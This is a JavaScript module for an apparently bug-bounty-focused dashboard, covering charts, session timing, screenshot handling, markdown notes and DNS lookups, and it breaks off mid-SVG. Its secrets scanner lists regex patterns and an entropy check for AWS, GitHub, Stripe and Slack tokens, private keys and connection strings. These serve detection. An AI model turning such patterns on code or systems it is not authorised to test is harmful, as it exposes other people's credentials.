// ============================================================
// 0xHunter — Extended Features Module
// Analytics, Screenshots, Markdown, Secrets Scanner, DNS,
// CVSS Calculator, Tags, Session Timer, Nuclei Templates,
// Finding Detail Modal, Vuln Templates
// ============================================================

// ── TAG SYSTEM ──────────────────────────────────────────────
function parseTags(raw) {
  if (!raw) return [];
  return String(raw).split(',').map(t => t.trim()).filter(Boolean);
}
function renderTagChips(tags, removable, onRemove) {
  if (!tags || !tags.length) return '';
  return tags.map((t, i) => `<span class="tag-chip">${esc(t)}${removable ? `<span class="tag-chip-x" onclick="(${onRemove})(${i})">×</span>` : ''}</span>`).join('');
}

// ── PER-TARGET SESSION TIMER ─────────────────────────────────
let activeSession = null; // { targetId, startTime }
let sessionInterval = null;

function startTargetSession(targetId) {
  if (activeSession && activeSession.targetId === targetId) return;
  if (activeSession) stopTargetSession(false);
  activeSession = { targetId, startTime: Date.now() };
  localStorage.setItem('0xh_active_session', JSON.stringify(activeSession));
  updateSessionDisplay();
  sessionInterval = setInterval(updateSessionDisplay, 1000);
  toast(`Session started for ${targetNameById(targetId)}`, 'success');
  if (typeof renderTargets === 'function') renderTargets();
}

function stopTargetSession(save = true) {
  if (!activeSession) return;
  clearInterval(sessionInterval);
  if (save) {
    const elapsed = Math.floor((Date.now() - activeSession.startTime) / 1000);
    const t = S.targets.find(x => x.id == activeSession.targetId);
    if (t) {
      t.sessionTime = (t.sessionTime || 0) + elapsed;
      fetch('/api/targets/' + t.id + '/session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ seconds: elapsed })
      });
      apiPost('/api/targets', t);
    }
    toast(`Session saved: ${formatSeconds(elapsed)}`, 'success');
  }
  activeSession = null;
  localStorage.removeItem('0xh_active_session');
  clearInterval(sessionInterval);
  updateSessionDisplay();
  if (typeof renderTargets === 'function') renderTargets();
}

function updateSessionDisplay() {
  const el = document.getElementById('active-session-bar');
  if (!el) return;
  if (!activeSession) {
    el.style.display = 'none';
    return;
  }
  const elapsed = Math.floor((Date.now() - activeSession.startTime) / 1000);
  const name = targetNameById(activeSession.targetId) || 'Target';
  el.style.display = 'flex';
  el.innerHTML = `<span class="pulse-dot"></span><span style="flex:1;font-size:11.5px;font-weight:600;color:var(--green); white-space:nowrap; overflow:hidden; text-overflow:ellipsis; min-width:0;">🎯 ${esc(name)}</span><span style="font-family:var(--mono);font-size:12px;color:var(--green)">${formatSeconds(elapsed)}</span><button class="btn btn-sm btn-danger" onclick="stopTargetSession(true)" style="padding:2px 8px;font-size:10px;">Stop</button>`;
}

function formatSeconds(sec) {
  const h = Math.floor(sec / 3600);
  const m = Math.floor((sec % 3600) / 60);
  const s = sec % 60;
  return `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
}

// ── ANALYTICS CHART ───────────────────────────────────────────
async function loadAndRenderAnalytics() {
  try {
    const res = await fetch('/api/stats');
    if (!res.ok) return;
    const data = await res.json();
    renderEarningsChart(data.monthly_labels, data.monthly_values);
    renderStatusDonut(data.status_counts);
    renderPlatformStats(data.platform_counts);
    renderActivityHeatmap();
  } catch (e) {
    console.error('Analytics load failed', e);
  }
}

function renderEarningsChart(labels, values) {
  const svg = document.getElementById('earnings-chart-svg');
  if (!svg) return;
  svg.innerHTML = `
    <defs>
      <linearGradient id="earnings-gradient" x1="0" y1="0" x2="0" y2="1">
        <stop offset="0%" stop-color="#64dc8c"></stop>
        <stop offset="100%" stop-color="#2a7a4a"></stop>
      </linearGradient>
    </defs>
  `;
  if (!values || !values.length || values.every(v => v === 0)) {
    svg.innerHTML += `
      <text x="50%" y="55%" fill="var(--text3)" font-size="12.5" font-family="Inter, sans-serif" text-anchor="middle">
        No earnings data yet — log bounty amounts in findings
      </text>
    `;
    return;
  }

  const max = Math.max(...values, 1);
  const width = svg.clientWidth || svg.getBoundingClientRect().width || 500;
  const height = 180;
  const pad = { t: 20, r: 20, b: 30, l: 60 };

  const chartW = width - pad.l - pad.r;
  const chartH = height - pad.t - pad.b;
  const bW = chartW / labels.length;

  let gridHtml = '';
  // Horizontal gridlines and Y labels
  for (let i = 0; i <= 4; i++) {
    const yVal = pad.t + chartH - (i / 4) * chartH;
    gridHtml += `
      <line x1="${pad.l}" y1="${yVal}" x2="${width - pad.r}" y2="${yVal}" class="earnings-grid-line" />
      <text x="${pad.l - 8}" y="${yVal + 3}" fill="var(--text3)" font-size="9" font-family="var(--mono)" text-anchor="end">
        $${Math.round((i / 4) * max).toLocaleString()}
      </text>
    `;
  }

  let barsHtml = '';
  let labelsHtml = '';
  values.forEach((v, i) => {
    const x = pad.l + i * bW + bW * 0.15;
    const w = bW * 0.7;
    const h = v > 0 ? Math.max(6, (v / max) * chartH) : 0;
    const y = pad.t + chartH - h;

    if (v > 0) {
      barsHtml += `
        <rect x="${x}" y="${y}" width="${w}" height="${h}" rx="4" ry="4" class="earnings-bar">
          <title>$${Math.round(v).toLocaleString()}</title>
        </rect>
        <text x="${x + w / 2}" y="${y - 4}" fill="#64dc8c" font-size="9.5" font-family="var(--mono)" font-weight="700" text-anchor="middle">
          $${Math.round(v).toLocaleString()}
        </text>
      `;
    } else {
      barsHtml += `
        <rect x="${x}" y="${pad.t + chartH - 4}" width="${w}" height="4" rx="1" fill="rgba(100,220,140,0.06)" />
      `;
    }

    labelsHtml += `
      <text x="${x + w / 2}" y="${height - 8}" fill="var(--text3)" font-size="9.5" font-family="Inter, sans-serif" text-anchor="middle">
        ${labels[i]}
      </text>
    `;
  });

  svg.innerHTML += gridHtml + barsHtml + labelsHtml;
}

function renderStatusDonut(counts) {
  const el = document.getElementById('status-donut');
  if (!el) return;
  const total = Object.values(counts).reduce((a, b) => a + b, 0);
  if (!total) {
    el.innerHTML = '<div class="empty-state" style="padding:20px 0;"><div class="es-sub">No findings recorded yet</div></div>';
    return;
  }

  const colors = {
    'Accepted': '#64dc8c',
    'Bounty Paid': '#a78bfa',
    'Reported': '#60a5fa',
    'Triaged': '#f59e0b',
    'Found': '#94a3b8',
    'Duplicate': '#ef4444',
    'N/A': '#6b7280'
  };

  const items = Object.entries(counts).sort((a, b) => b[1] - a[1]);
  const circumference = 282.743; // 2 * pi * r (r=45)

  let svgHtml = '';
  let currentOffset = 0;

  items.forEach(([status, val]) => {
    const pct = val / total;
    const dash = pct * circumference;
    const offset = -currentOffset;
    currentOffset += dash;
    const color = colors[status] || '#888';

    if (val > 0) {
      svgHtml += `
        <circle cx="65" cy="65" r="45"
          class="status-donut-segment"
          stroke="${color}"
          stroke-dasharray="${dash} ${circumference}"
          stroke-dashoffset="${offset}"
          transform="rotate(-90 65 65)">
          <title>${esc(status)}: ${val} (${Math.round(pct * 100)}%)</title>
        </circle>
      `;
    }
  });

  const legendHtml = items.map(([status, val]) => {
    const color = colors[status] || '#888';
    const pct = Math.round((val / total) * 100);
    return `
      <div class="donut-leg-item" style="display:flex;align-items:center;padding:5px 8px;border-radius:4px;margin-bottom:4px;background:var(--bg3);font-size:12px;">
        <span style="display:inline-block;width:10px;height:10px;border-radius:50%;background:${color};margin-right:8px;flex-shrink:0;"></span>
        <span style="flex:1;font-weight:500;color:var(--text2);">${esc(status)}</span>
        <span style="font-weight:700;font-family:var(--mono);color:#fff;margin-right:6px;">${val}</span>
        <span style="font-size:9.5px;color:var(--text3);font-family:var(--mono);">${pct}%</span>
      </div>
    `;
  }).join('');

  el.innerHTML = `
    <div class="status-donut-wrapper">
      <div class="status-donut-container">
        <svg width="130" height="130" viewBox="0 0 130 130" id="status-donut-svg">
          ${svgHtml}
        </svg>
        <div class="status-donut-center">
          <div class="status-donut-val" id="status-donut-center-val">${total}</div>
          <div class="status-donut-lbl" id="status-donut-center-lbl">Total</div>
        </div>
      </div>
      <div class="status-donut-legend">
        ${legendHtml}
      </div>
    </div>
  `;
}

function renderPlatformStats(counts) {
  const el = document.getElementById('platform-stats');
  if (!el) return;
  const total = Object.values(counts).reduce((a, b) => a + b, 0);
  if (!total) {
    el.innerHTML = '<div class="empty-state" style="padding:20px 0;"><div class="es-sub">No target platforms mapped yet</div></div>';
    return;
  }
  el.innerHTML = Object.entries(counts).sort((a,b)=>b[1]-a[1]).map(([k, v]) => `
    <div style="margin-bottom:10px">
      <div style="display:flex;justify-content:space-between;font-size:12px;margin-bottom:4px">
        <span style="font-weight:600;color:var(--text2);">${esc(k)}</span>
        <span style="font-weight:700;font-family:var(--mono);color:#fff;">${v} ${v > 1 ? 'targets' : 'target'}</span>
      </div>
      <div style="background:var(--bg3);border-radius:4px;height:6px;overflow:hidden">
        <div style="height:100%;width:${Math.round(v/total*100)}%;background:linear-gradient(90deg,var(--accent),var(--purple));border-radius:4px;transition:width .6s ease"></div>
      </div>
    </div>`).join('');
}

function renderActivityHeatmap() {
  const el = document.getElementById('activity-heatmap-grid');
  if (!el) return;
  
  const now = Date.now();
  const oneDay = 24 * 60 * 60 * 1000;
  
  const activityMap = {};
  for (let offset = 29; offset >= 0; offset--) {
    const dateStr = new Date(now - offset * oneDay).toDateString();
    activityMap[dateStr] = { count: 0, date: now - offset * oneDay };
  }

  S.findings.forEach(f => {
    if (f.created_at || f.time) {
      const fTime = f.created_at ? new Date(f.created_at).getTime() : f.time;
      const dateStr = new Date(fTime).toDateString();
      if (activityMap[dateStr]) {
        activityMap[dateStr].count++;
      }
    }
  });

  S.activity.forEach(a => {
    const dateStr = new Date(a.time).toDateString();
    if (activityMap[dateStr]) {
      activityMap[dateStr].count++;
    }
  });

  const sortedKeys = Object.keys(activityMap);
  el.innerHTML = sortedKeys.map(key => {
    const item = activityMap[key];
    const c = item.count;
    const dateFormatted = new Date(item.date).toLocaleDateString(undefined, { month: 'short', day: 'numeric', year: 'numeric' });
    let level = 0;
    if (c === 1) level = 1;
    else if (c > 1 && c <= 3) level = 2;
    else if (c > 3 && c <= 6) level = 3;
    else if (c > 6) level = 4;

    return `
      <div class="activity-tile level-${level}">
        <div class="activity-tile-tooltip">${c} activity logs on ${dateFormatted}</div>
      </div>
    `;
  }).join('');

  // Calculate and populate summary active days
  const activeDaysCount = sortedKeys.filter(key => activityMap[key].count > 0).length;
  const summaryEl = document.getElementById('activity-heatmap-summary');
  if (summaryEl) {
    summaryEl.textContent = `${activeDaysCount} active day${activeDaysCount !== 1 ? 's' : ''} in last 30 days`;
  }

  // Calculate streaks and total logs
  let longestStreak = 0;
  let tempStreak = 0;
  sortedKeys.forEach(key => {
    if (activityMap[key].count > 0) {
      tempStreak++;
      if (tempStreak > longestStreak) {
        longestStreak = tempStreak;
      }
    } else {
      tempStreak = 0;
    }
  });

  let currentStreak = 0;
  for (let idx = sortedKeys.length - 1; idx >= 0; idx--) {
    const key = sortedKeys[idx];
    if (activityMap[key].count > 0) {
      currentStreak++;
    } else {
      if (idx === sortedKeys.length - 1) {
        // Today is 0. Check yesterday.
        continue;
      } else {
        break;
      }
    }
  }

  const totalLogs = Object.values(activityMap).reduce((acc, item) => acc + item.count, 0);
  const consistencyScore = Math.round((activeDaysCount / 30) * 100);

  // Set streak and consistency values in DOM
  const curStreakEl = document.getElementById('stat-current-streak');
  if (curStreakEl) curStreakEl.textContent = `${currentStreak} day${currentStreak !== 1 ? 's' : ''}`;

  const longStreakEl = document.getElementById('stat-longest-streak');
  if (longStreakEl) longStreakEl.textContent = `${longestStreak} day${longestStreak !== 1 ? 's' : ''}`;

  const scoreEl = document.getElementById('stat-consistency-score');
  if (scoreEl) scoreEl.textContent = `${consistencyScore}%`;

  const totalLogsEl = document.getElementById('stat-total-logs');
  if (totalLogsEl) totalLogsEl.textContent = `${totalLogs} log${totalLogs !== 1 ? 's' : ''}`;
}

// ── SCREENSHOT ATTACHMENT ─────────────────────────────────────
let currentScreenshots = []; // array of base64 data URLs

function initScreenshotPaste() {
  document.addEventListener('paste', async (e) => {
    // 1. Findings Modal
    const modalOpen = document.getElementById('modal-finding')?.classList.contains('open') ||
                      document.getElementById('modal-finding-detail')?.classList.contains('open');
    if (modalOpen) {
      const items = e.clipboardData?.items || [];
      for (const item of items) {
        if (item.type.startsWith('image/')) {
          const blob = item.getAsFile();
          const reader = new FileReader();
          reader.onload = ev => addScreenshot(ev.target.result);
          reader.readAsDataURL(blob);
          return;
        }
      }
    }

    // 2. Note Editor Markdown Upload
    const textarea = document.getElementById('edit-note-body');
    const noteActive = textarea && document.activeElement === textarea;
    if (noteActive) {
      const items = e.clipboardData?.items || [];
      for (const item of items) {
        if (item.type.startsWith('image/')) {
          e.preventDefault();
          const blob = item.getAsFile();
          const reader = new FileReader();
          reader.onload = async ev => {
            const b64 = ev.target.result;
            const insertPos = textarea.selectionStart;
            const oldVal = textarea.value;
            const placeholder = '\n![Uploading image...]()\n';
            textarea.value = oldVal.substring(0, insertPos) + placeholder + oldVal.substring(textarea.selectionEnd);
            textarea.selectionStart = textarea.selectionEnd = insertPos + placeholder.length;
            
            try {
              const res = await fetch('/api/upload_image', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image_base64: b64 })
              });
              const data = await res.json();
              if (data.url) {
                textarea.value = textarea.value.replace(placeholder, `\n![Screenshot](${data.url})\n`);
                toast('Image uploaded to note', 'success');
              } else {
                textarea.value = textarea.value.replace(placeholder, '');
                toast('Image upload failed: ' + (data.error || 'Unknown error'), 'error');
              }
              if (typeof saveCurrentNote === 'function') saveCurrentNote();
            } catch(err) {
              textarea.value = textarea.value.replace(placeholder, '');
              toast('Image upload failed', 'error');
              if (typeof saveCurrentNote === 'function') saveCurrentNote();
            }
          };
          reader.readAsDataURL(blob);
          return;
        }
      }
    }
  });
}

async function uploadNoteImage(input) {
  if (!input.files || !input.files[0]) return;
  const file = input.files[0];
  const reader = new FileReader();
  reader.onload = async ev => {
    const b64 = ev.target.result;
    const textarea = document.getElementById('edit-note-body');
    const insertPos = textarea.selectionStart;
    const oldVal = textarea.value;
    const placeholder = '\n![Uploading image...]()\n';
    textarea.value = oldVal.substring(0, insertPos) + placeholder + oldVal.substring(textarea.selectionEnd);
    textarea.selectionStart = textarea.selectionEnd = insertPos + placeholder.length;
    input.value = ''; // Reset file input
    
    try {
      const res = await fetch('/api/upload_image', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image_base64: b64 })
      });
      const data = await res.json();
      if (data.url) {
        textarea.value = textarea.value.replace(placeholder, `\n![Image](${data.url})\n`);
        toast('Image uploaded to note', 'success');
      } else {
        textarea.value = textarea.value.replace(placeholder, '');
        toast('Image upload failed: ' + (data.error || 'Unknown error'), 'error');
      }
      if (typeof saveCurrentNote === 'function') saveCurrentNote();
    } catch(err) {
      textarea.value = textarea.value.replace(placeholder, '');
      toast('Image upload failed', 'error');
      if (typeof saveCurrentNote === 'function') saveCurrentNote();
    }
  };
  reader.readAsDataURL(file);
}

function addScreenshot(dataUrl) {
  currentScreenshots.push(dataUrl);
  renderScreenshotPreviews();
  toast('Screenshot attached', 'success');
}

function removeScreenshot(idx) {
  currentScreenshots.splice(idx, 1);
  renderScreenshotPreviews();
}

function renderScreenshotPreviews() {
  const el = document.getElementById('screenshot-previews');
  if (!el) return;
  if (!currentScreenshots.length) {
    el.innerHTML = '<div style="color:var(--text3);font-size:11.5px;padding:8px 0">Paste screenshots with Ctrl+V</div>';
    return;
  }
  el.innerHTML = currentScreenshots.map((src, i) => `
    <div class="screenshot-thumb">
      <img src="${src}" onclick="viewScreenshot('${i}')" title="Click to enlarge">
      <button class="screenshot-del" onclick="removeScreenshot(${i})">✕</button>
    </div>`).join('');
}

function viewScreenshot(idx) {
  const src = currentScreenshots[idx];
  const overlay = document.createElement('div');
  overlay.className = 'screenshot-lightbox';
  overlay.innerHTML = `<img src="${src}" style="max-width:90vw;max-height:90vh;border-radius:8px;box-shadow:0 20px 80px rgba(0,0,0,0.8)"><button onclick="this.parentElement.remove()" style="position:absolute;top:20px;right:20px;background:rgba(255,255,255,0.15);border:none;color:#fff;font-size:24px;cursor:pointer;border-radius:50%;width:40px;height:40px">×</button>`;
  overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };
  document.body.appendChild(overlay);
}

// ── MARKDOWN PREVIEW FOR NOTES ────────────────────────────────
function toggleNotePreview() {
  const textarea = document.getElementById('edit-note-body');
  const preview = document.getElementById('note-preview-area');
  const btn = document.getElementById('note-preview-btn');
  if (!textarea || !preview) return;
  const showing = preview.style.display === 'block';
  if (showing) {
    preview.style.display = 'none';
    textarea.style.display = 'block';
    btn.textContent = '👁 Preview';
    btn.classList.remove('active');
  } else {
    preview.innerHTML = renderMarkdown(textarea.value);
    preview.style.display = 'block';
    textarea.style.display = 'none';
    btn.textContent = '✏️ Edit';
    btn.classList.add('active');
  }
}

function renderMarkdown(text) {
  if (!text) return '<p style="color:var(--text3)">Empty note</p>';
  let html = esc(text);
  // Code blocks (must be first)
  html = html.replace(/```([^`]*?)```/gs, (_, code) =>
    `<pre class="md-code-block"><code>${code.trim()}</code></pre>`);
  html = html.replace(/`([^`]+)`/g, '<code class="md-inline-code">$1</code>');
  // Headers
  html = html.replace(/^######\s(.+)$/gm, '<h6 class="md-h">$1</h6>');
  html = html.replace(/^#####\s(.+)$/gm, '<h5 class="md-h">$1</h5>');
  html = html.replace(/^####\s(.+)$/gm, '<h4 class="md-h">$1</h4>');
  html = html.replace(/^###\s(.+)$/gm, '<h3 class="md-h">$1</h3>');
  html = html.replace(/^##\s(.+)$/gm, '<h2 class="md-h">$1</h2>');
  html = html.replace(/^#\s(.+)$/gm, '<h1 class="md-h">$1</h1>');
  // Bold / Italic
  html = html.replace(/\*\*\*(.+?)\*\*\*/g, '<strong><em>$1</em></strong>');
  html = html.replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>');
  html = html.replace(/\*(.+?)\*/g, '<em>$1</em>');
  // Horizontal rule
  html = html.replace(/^---$/gm, '<hr class="md-hr">');
  // Checkboxes
  html = html.replace(/^- \[x\] (.+)$/gm, '<div class="md-check done">✓ $1</div>');
  html = html.replace(/^- \[ \] (.+)$/gm, '<div class="md-check">☐ $1</div>');
  // Unordered lists
  html = html.replace(/^[-*] (.+)$/gm, '<li class="md-li">$1</li>');
  html = html.replace(/(<li[^>]*>.*<\/li>\n?)+/gs, m => `<ul class="md-ul">${m}</ul>`);
  // Ordered lists
  html = html.replace(/^\d+\. (.+)$/gm, '<li class="md-li">$1</li>');
  // Images
  html = html.replace(/!\[([^\]]*)\]\(([^)]+)\)/g, '<img src="$2" alt="$1" class="md-img" style="max-width:100%;border-radius:8px;margin:12px 0;border:1px solid var(--border);">');
  // Links
  html = html.replace(/\[([^\]]+)\]\((https?:\/\/[^\)]+)\)/g, '<a href="$2" target="_blank" class="md-link">$1</a>');
  // Inline URL auto-link
  html = html.replace(/(https?:\/\/[^\s<>"]+)/g, '<a href="$1" target="_blank" class="md-link">$1</a>');
  // Newlines to paragraphs (skip lines that are already block elements)
  html = html.replace(/\n\n/g, '</p><p class="md-p">');
  html = html.replace(/\n/g, '<br>');
  return '<p class="md-p">' + html + '</p>';
}

// ── SECRETS SCANNER ───────────────────────────────────────────
const secretPatterns = [
  { name: 'AWS Access Key', regex: /AKIA[0-9A-Z]{16}/g, severity: 'critical' },
  { name: 'AWS Secret Key', regex: /[0-9a-zA-Z\/+]{40}(?=[^0-9a-zA-Z\/+]|$)/g, severity: 'high' },
  { name: 'GitHub Token (Classic)', regex: /ghp_[a-zA-Z0-9]{36}/g, severity: 'critical' },
  { name: 'GitHub Token (Fine-grained)', regex: /github_pat_[a-zA-Z0-9_]{82}/g, severity: 'critical' },
  { name: 'GitHub Actions Token', regex: /ghs_[a-zA-Z0-9]{36}/g, severity: 'critical' },
  { name: 'Stripe Live Key', regex: /sk_live_[0-9a-zA-Z]{24,}/g, severity: 'critical' },
  { name: 'Stripe Test Key', regex: /sk_test_[0-9a-zA-Z]{24,}/g, severity: 'medium' },
  { name: 'Stripe Publishable Key', regex: /pk_live_[0-9a-zA-Z]{24,}/g, severity: 'low' },
  { name: 'Google API Key', regex: /AIza[0-9A-Za-z\-_]{35}/g, severity: 'high' },
  { name: 'Google OAuth Client Secret', regex: /[0-9a-zA-Z_-]{24}\.apps\.googleusercontent\.com/g, severity: 'high' },
  { name: 'Slack Bot Token', regex: /xoxb-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*/g, severity: 'high' },
  { name: 'Slack Webhook URL', regex: /https:\/\/hooks\.slack\.com\/services\/T[a-zA-Z0-9_]{8,}\/B[a-zA-Z0-9_]{8,}\/[a-zA-Z0-9_]{24,}/g, severity: 'high' },
  { name: 'Twilio Account SID', regex: /AC[a-zA-Z0-9]{32}/g, severity: 'high' },
  { name: 'Twilio Auth Token', regex: /SK[0-9a-f]{32}/g, severity: 'high' },
  { name: 'JWT Token', regex: /eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}/g, severity: 'medium' },
  { name: 'RSA Private Key', regex: /-----BEGIN RSA PRIVATE KEY-----/g, severity: 'critical' },
  { name: 'SSH Private Key', regex: /-----BEGIN (EC|OPENSSH|DSA|RSA) PRIVATE KEY-----/g, severity: 'critical' },
  { name: 'SendGrid API Key', regex: /SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}/g, severity: 'high' },
  { name: 'Mailgun API Key', regex: /key-[0-9a-zA-Z]{32}/g, severity: 'high' },
  { name: 'Firebase URL', regex: /[a-z0-9-]+\.firebaseio\.com/g, severity: 'medium' },
  { name: 'MongoDB Connection String', regex: /mongodb(\+srv)?:\/\/[^@\s"']+:[^@\s"']+@[^\s"']+/g, severity: 'critical' },
  { name: 'Password in URL', regex: /[a-z]{3,10}:\/\/[^@\s]+:[^@\s]+@[^\s]+/g, severity: 'high' },
  { name: 'HackerOne API Token', regex: /[0-9a-f]{40}/g, severity: 'low' },
  { name: 'Hardcoded Password', regex: /(?:password|passwd|pwd|secret|api_key|apikey|auth)\s*[:=]\s*["'][^"']{6,}["']/gi, severity: 'high' },
  { name: 'Bearer Token', regex: /Bearer\s+[a-zA-Z0-9\-_]{20,}/g, severity: 'medium' },
  { name: 'Basic Auth (base64)', regex: /Basic\s+[A-Za-z0-9+\/]{20,}={0,2}/g, severity: 'medium' },
  { name: 'Heroku API Key', regex: /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/g, severity: 'medium' },
  { name: 'Azure Storage Key', regex: /DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[^;]{80,}/g, severity: 'critical' },
  { name: 'NPM Auth Token', regex: /\/\/registry\.npmjs\.org\/:_authToken=[0-9a-z]{36}/g, severity: 'high' },
];

function calcShannonEntropy(str) {
  if (!str) return 0;
  const len = str.length;
  const freq = {};
  for (let i = 0; i < len; i++) {
    freq[str[i]] = (freq[str[i]] || 0) + 1;
  }
  let entropy = 0;
  for (const char in freq) {
    const p = freq[char] / len;
    entropy -= p * Math.log2(p);
  }
  return entropy;
}

function getSecretsContext(text, pos, val) {
  const lines = text.split('\n');
  let currentPos = 0;
  let lineIndex = 0;
  for (let i = 0; i < lines.length; i++) {
    if (currentPos <= pos && pos <= currentPos + lines[i].length + 1) {
      lineIndex = i;
      break;
    }
    currentPos += lines[i].length + 1;
  }
  const start = Math.max(0, lineIndex - 1);
  const end = Math.min(lines.length - 1, lineIndex + 1);
  let ctxStr = '';
  for (let idx = start; idx <= end; idx++) {
    const lineNum = idx + 1;
    let lineContent = esc(lines[idx]);
    if (idx === lineIndex) {
      const escVal = esc(val);
      if (lineContent.includes(escVal)) {
        lineContent = lineContent.replace(escVal, `<mark>${escVal}</mark>`);
      } else {
        lineContent = `<mark>${lineContent}</mark>`;
      }
      ctxStr += `<span style="color:#fff;">${lineNum}: ${lineContent}</span>\n`;
    } else {
      ctxStr += `<span>${lineNum}: ${lineContent}</span>\n`;
    }
  }
  return ctxStr;
}

// ── DRAG AND DROP FILE HANDLERS ──
function handleSecretsDrop(e) {
  const files = e.dataTransfer.files;
  if (files.length) {
    readSecretsFile(files[0]);
  }
}

function handleSecretsFileSelect(input) {
  if (input.files.length) {
    readSecretsFile(input.files[0]);
  }
}

function readSecretsFile(file) {
  const reader = new FileReader();
  reader.onload = function(e) {
    const textarea = document.getElementById('secrets-input');
    if (textarea) {
      textarea.value = e.target.result;
      runSecretsScanner();
    }
  };
  reader.readAsText(file);
}

function runSecretsScanner() {
  const input = document.getElementById('secrets-input')?.value || '';
  const results = document.getElementById('secrets-results');
  if (!results) return;
  if (!input.trim()) { results.innerHTML = '<div style="color:var(--text3);font-size:12px">Paste source code, JS files, or response bodies above</div>'; return; }
  
  const found = [];
  const matchedPositions = new Set();

  // 1. Pattern matching (Regex)
  for (const pat of secretPatterns) {
    pat.regex.lastIndex = 0;
    const matches = [...input.matchAll(pat.regex)];
    for (const m of matches) {
      const val = m[0];
      if (val.length < 8) continue;
      found.push({ name: pat.name, value: val, severity: pat.severity, pos: m.index });
      matchedPositions.add(m.index);
    }
  }

  // 2. High Entropy token matching
  // Candidate words: alphanumeric/base64 style strings of length 16 to 64
  const entropyCandidates = [...input.matchAll(/(?:["'=:;,\s]|^)([A-Za-z0-9_\-\+\/]{16,64})(?:["'=:;,\s]|$)/g)];
  for (const m of entropyCandidates) {
    const val = m[1];
    const pos = m.index;
    if (matchedPositions.has(pos) || val.length < 16) continue;
    
    // Skip common protocols or English-like words
    if (val.startsWith('http') || val.includes('/') && !val.includes('==')) continue;

    const hexRegex = /^[0-9a-fA-F]+$/;
    const b64Regex = /^[A-Za-z0-9+\/=]+$/;
    const entropy = calcShannonEntropy(val);

    if (hexRegex.test(val) && entropy > 3.0 && val.length >= 32) {
      found.push({ name: `High Entropy Hex Token (H=${entropy.toFixed(2)})`, value: val, severity: 'high', pos: pos });
      matchedPositions.add(pos);
    } else if (b64Regex.test(val) && entropy > 4.3 && val.length >= 22) {
      found.push({ name: `High Entropy Base64 Key (H=${entropy.toFixed(2)})`, value: val, severity: 'critical', pos: pos });
      matchedPositions.add(pos);
    }
  }

  if (!found.length) {
    results.innerHTML = '<div class="secret-none">✓ No obvious secrets or high-entropy tokens detected.</div>';
    return;
  }

  results.innerHTML = found.map(f => {
    const ctxHtml = getSecretsContext(input, f.pos, f.value);
    return `
    <div class="secret-hit sev-${f.severity}">
      <div class="secret-hit-head">
        <strong class="secret-hit-name" style="color:var(--text);">${esc(f.name)}</strong>
        <span class="secret-hit-sev">${f.severity.toUpperCase()}</span>
      </div>
      <div class="secret-hit-val">${esc(f.value)}</div>
      <pre class="secret-hit-ctx">${ctxHtml}</pre>
      <div style="margin-top:10px;text-align:right;">
        <button class="btn btn-sm" onclick="window.copyTextToClipboard('${f.value.replace(/'/g,"\\\\'")}').then(()=>toast('Copied Key!'))">📋 Copy Key</button>
      </div>
    </div>`;
  }).join('');
  
  toast(`Found ${found.length} potential secret(s)!`, found.some(f=>f.severity==='critical') ? 'error' : 'success');
}

// ── DNS LOOKUP ────────────────────────────────────────────────
async function dnsLookup() {
  const domain = document.getElementById('dns-domain')?.value.trim();
  const qtype = document.getElementById('dns-qtype')?.value || 'A';
  const out = document.getElementById('dns-results');
  const visCard = document.getElementById('dns-visualizer-card');
  if (!domain || !out) return;
  out.innerHTML = '<div style="color:var(--accent);font-size:12px">Resolving...</div>';
  if (visCard) visCard.style.display = 'none';
  try {
    const res = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=${qtype}`);
    const data = await res.json();
    if (!data.Answer || !data.Answer.length) {
      out.innerHTML = `<div class="secret-none">No ${qtype} records found for <strong>${esc(domain)}</strong>${data.Status !== 0 ? ` (Error code: ${data.Status})` : ''}</div>`;
      if (visCard) visCard.style.display = 'none';
      return;
    }
    out.innerHTML = `
      <div style="margin-bottom:8px;font-size:11.5px;color:var(--text3)">
        ${data.Answer.length} record(s) found — Status: ${data.Status === 0 ? '✓ OK' : '✗ Error ' + data.Status}
      </div>
      ${data.Answer.map(r => `
        <div class="dns-record">
          <span class="dns-type">${esc(r.type === 1 ? 'A' : r.type === 28 ? 'AAAA' : r.type === 5 ? 'CNAME' : r.type === 15 ? 'MX' : r.type === 16 ? 'TXT' : r.type === 2 ? 'NS' : r.type === 6 ? 'SOA' : 'TYPE' + r.type)}</span>
          <span class="dns-name">${esc(r.name)}</span>
          <span class="dns-data">${esc(r.data)}</span>
          <span class="dns-ttl">TTL: ${r.TTL}s</span>
          <button class="copy-btn" onclick="window.copyTextToClipboard('${r.data.replace(/'/g,"\\\\'")}').then(()=>toast('Copied!'))">📋</button>
        </div>`).join('')}
      ${data.Authority ? data.Authority.map(r => `<div class="dns-record dns-authority"><span class="dns-type">AUTH</span><span class="dns-data">${esc(r.data)}</span></div>`).join('') : ''}`;
      
    // Trigger visualizer
    if (typeof drawDnsTree === 'function') {
      drawDnsTree(domain, data.Answer);
    }
  } catch (e) {
    out.innerHTML = `<div style="color:var(--red);font-size:12px">Lookup failed: ${esc(e.message)}<br><span style="color:var(--text3)">Note: DNS over HTTPS requires internet access.</span></div>`;
    if (visCard) visCard.style.display = 'none';
  }
}

function drawDnsTree(rootDomain, answers) {
  const svg = document.getElementById('dns-tree-canvas');
  const warningEl = document.getElementById('dns-takeover-warning');
  const cardEl = document.getElementById('dns-visualizer-card');
  if (!svg || !cardEl) return;
  
  cardEl.style.display = 'block';
  svg.innerHTML = '';
  if (warningEl) { warningEl.innerHTML = ''; warningEl.style.color = ''; }

  const width = svg.clientWidth || 800;
  const height = 320;
  svg.setAttribute('viewBox', `0 0 ${width} ${height}`);

  svg.innerHTML += `
    <defs>
